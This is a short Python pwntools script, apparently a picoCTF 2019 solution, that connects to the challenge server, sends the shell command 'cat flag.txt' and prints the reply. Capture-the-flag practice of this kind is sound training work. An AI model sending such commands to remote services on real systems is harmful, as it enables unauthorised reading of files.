from pwn import*

s = remote('2019shell1.picoctf.com', 49816)

print(s.recv())
s.sendline('cat flag.txt')

print(s.recv())



s.close()
